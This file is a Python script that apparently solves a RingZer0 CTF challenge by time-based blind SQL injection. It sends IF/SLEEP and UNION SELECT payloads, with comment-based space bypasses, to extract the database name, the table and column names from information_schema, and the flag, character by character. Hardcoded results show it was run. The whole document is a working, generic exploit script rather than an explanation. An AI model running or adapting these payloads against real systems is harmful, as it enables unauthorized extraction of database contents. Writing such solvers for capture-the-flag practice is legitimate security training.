import requests
from time import time
from concurrent.futures import ThreadPoolExecutor

TARGET = "http://challenges.ringzer0team.com:10037"

CHS = [i for i in range(0x20, 0x7f)]
CHS.remove(ord("'"))
CHS.remove(ord("\\"))

def req(arg):

    # spaces are removed, so to simulate them use empty comments
    arg = arg.replace(' ', '/**/')

    res = requests.get(f"{TARGET}/?q={arg}")
    return res.status_code, res.content

def time_req(cond, sleep_on_false=True):

    if sleep_on_false is True:
        r = f"IF({cond},1,SLEEP(0.1))"
    else:
        r = f"IF({cond},SLEEP(0.1),1)"

    t = time()
    req(r)
    t = time() - t

    return t

def time_req_select(cond, sleep_on_false=True):

    if sleep_on_false is True:
        r = f"1 UNION SELECT NULL,NULL WHERE 1=IF(({cond}),1,SLEEP(2))#"
    else:
        r = f"1 UNION SELECT NULL,NULL WHERE 1=IF(({cond}),SLEEP(2),1)#"

    t = time()
    req(r)
    t = time() - t

    return t

def max_from_time_queries(ts):

    l = None,
    t = -1

    for l_, t_ in ts.items():
        if t_ > t:
            l = l_ 
            t = t_

    return l

def trunc_common(s):

    idx_dif = len(s[0])

    for r in s.keys():

        if r == 0:
            continue
    
        idx_dif_ = 0
        while idx_dif_ < len(s[r]) and idx_dif_ < len(s[0]) and s[0][idx_dif_] == s[r][idx_dif_]:
            idx_dif_ += 1
        
        if idx_dif_ < idx_dif:
            idx_dif = idx_dif_

    return s[0][:idx_dif]

def str_to_hexrep(s):

    hr = 0

    i = 0
    while i < len(s):

        hr += ord(s[i])
        hr <<= 8

        i += 1

    hr >>= 8
    hr = hex(hr)

    return hr

def guess_entry_count():

    '''
        assuming N SLEEP calls for N ids
    '''

    TCNT = 4

    t = 0
    for _ in range(TCNT):

        t_ = time()
        req("1233456789")
        t += time() - t_

    tsleep = 0
    for _ in range(TCNT):

        t_ = time()
        req("SLEEP(0.1)")
        tsleep += time() - t_

    entry_cnt = (tsleep - t) // (TCNT * 0.1)

    print(f"probably {entry_cnt} entries")
    return entry_cnt

def db_name():

    with ThreadPoolExecutor(max_workers = 8) as threadpool:

        MAX_LEN = 20

        ROUND_CNT = 3
        dbname = {r: [] for r in range(ROUND_CNT)}
        for r in range(ROUND_CNT):

            for i in range(MAX_LEN):

                ts = {c_ord: None for c_ord in CHS}
                for c_ord in ts.keys():
                    ts[c_ord] = threadpool.submit(time_req, f"STRCMP(ORD(SUBSTRING(database(),{i + 1},1)),{c_ord})")

                for c_ord in ts.keys():
                    ts[c_ord] = ts[c_ord].result()

                dbname[r].append(chr(max_from_time_queries(ts)))

        print(dbname)

        dbname = trunc_common(dbname)
        dbname = ''.join(dbname)

        print(f"database name {dbname}")
        return dbname

def table_names(dbname):

    dbname = str_to_hexrep(dbname)

    with ThreadPoolExecutor(max_workers = 8) as threadpool:

        table_cnt = ''

        for i in range(1):
        
            ts = {c_ord: None for c_ord in CHS}

            for c_ord in ts.keys():
                ts[c_ord] = threadpool.submit(time_req_select, f"STRCMP(ORD(SUBSTRING((SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema={dbname}),{i + 1},1)),{c_ord})")
            
            for c_ord in ts.keys():
                ts[c_ord] = ts[c_ord].result()

            table_cnt += f'{chr(max_from_time_queries(ts))}'

        table_cnt = int(table_cnt, 10)
        print(f"database {dbname} has {table_cnt} tables")

        MAX_LEN = 20

        ROUND_CNT = 3
        tables =    {
                        i: 
                        {
                            t_idx: None
                            for t_idx in range(table_cnt)
                        } 
                        for i in range(ROUND_CNT)
                    }

        for r in range(ROUND_CNT):
            for t_idx in range(table_cnt):

                name = []
                for i in range(MAX_LEN):

                    ts = {c_ord: None for c_ord in CHS}
                    for c_ord in ts.keys():
                        ts[c_ord] = threadpool.submit(time_req_select, f"STRCMP(ORD(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema={dbname} LIMIT {t_idx},1),{i + 1},1)),{c_ord})")

                    for c_ord in ts.keys():
                        ts[c_ord] = ts[c_ord].result()

                    name.append(chr(max_from_time_queries(ts)))

                tables[r][t_idx] = ''.join(name)

        for t_idx in range(table_cnt):
            
            idx_dif = len(tables[0][t_idx])

            for r in range(1, ROUND_CNT):
            
                idx_dif_ = 0
                while tables[0][t_idx][idx_dif_] == tables[r][t_idx][idx_dif_]:
                    idx_dif_ += 1
                
                if idx_dif_ < idx_dif:
                    idx_dif = idx_dif_

            tables[0][t_idx] = tables[0][t_idx][:idx_dif]
            print(f"found table {tables[0][t_idx]}")

        return [tables[0][t_idx] for t_idx in range(table_cnt)]

def flag_table_columns(flag_table):

    flag_table = str_to_hexrep(flag_table)

    with ThreadPoolExecutor(max_workers = 16) as threadpool:

        column_cnt = ''

        for i in range(1):
        
            ts = {c_ord: None for c_ord in CHS}

            for c_ord in ts.keys():
                ts[c_ord] = threadpool.submit(time_req_select, f"STRCMP(ORD(SUBSTRING((SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name={flag_table}),{i + 1},1)),{c_ord})")
            
            for c_ord in ts.keys():
                ts[c_ord] = ts[c_ord].result()

            column_cnt += f'{chr(max_from_time_queries(ts))}'

        column_cnt = int(column_cnt, 10)
        print(f"flag table {flag_table} has {column_cnt} columns")

        MAX_LEN = 20

        ROUND_CNT = 3
        columns =    {
                        i: 
                        {
                            t_idx: None
                            for t_idx in range(column_cnt)
                        } 
                        for i in range(ROUND_CNT)
                    }

        for r in range(ROUND_CNT):
            for t_idx in range(column_cnt):

                name = []
                for i in range(MAX_LEN):

                    ts = {c_ord: None for c_ord in CHS}
                    for c_ord in ts.keys():
                        ts[c_ord] = threadpool.submit(time_req_select, f"STRCMP(ORD(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name={flag_table} LIMIT {t_idx},1),{i + 1},1)),{c_ord})")

                    for c_ord in ts.keys():
                        ts[c_ord] = ts[c_ord].result()

                    name.append(chr(max_from_time_queries(ts)))

                columns[r][t_idx] = ''.join(name)

        for t_idx in range(column_cnt):
            
            idx_dif = len(columns[0][t_idx])

            for r in range(1, ROUND_CNT):
            
                idx_dif_ = 0
                while columns[0][t_idx][idx_dif_] == columns[r][t_idx][idx_dif_]:
                    idx_dif_ += 1
                
                if idx_dif_ < idx_dif:
                    idx_dif = idx_dif_

            columns[0][t_idx] = columns[0][t_idx][:idx_dif]
            print(f"found columns {columns[0][t_idx]}")

        return [columns[0][t_idx] for t_idx in range(column_cnt)]

def read_flag_table(dbname, tablename, flag_column):

    flag_table = f"{dbname}.{tablename}"

    with ThreadPoolExecutor(max_workers = 16) as threadpool:

        MAX_LEN = 60

        ROUND_CNT = 3
        flag = {r: [] for r in range(ROUND_CNT)}
        for r in range(ROUND_CNT):

            for i in range(MAX_LEN):

                ts = {c_ord: None for c_ord in CHS}
                for c_ord in ts.keys():
                    ts[c_ord] = threadpool.submit(time_req_select, f"STRCMP(ORD(SUBSTRING((SELECT {flag_column} FROM {flag_table}),{i + 1},1)),{c_ord})")

                for c_ord in ts.keys():
                    ts[c_ord] = ts[c_ord].result()

                flag[r].append(chr(max_from_time_queries(ts)))

        print(flag)
            
        flag = trunc_common(flag)
        print(f"flag {flag}")

def start():

    #guess_entry_count()

    #dbname = db_name()
    dbname = "sqli_quote"

    #tables = table_names(dbname)
    tables = ["alkdjf4iu", "quotes"]

    #columns = flag_table_columns(tables[0])
    columns = ["i", "flag"]

    read_flag_table(dbname, tables[0], columns[1])

if __name__ == "__main__":
    start()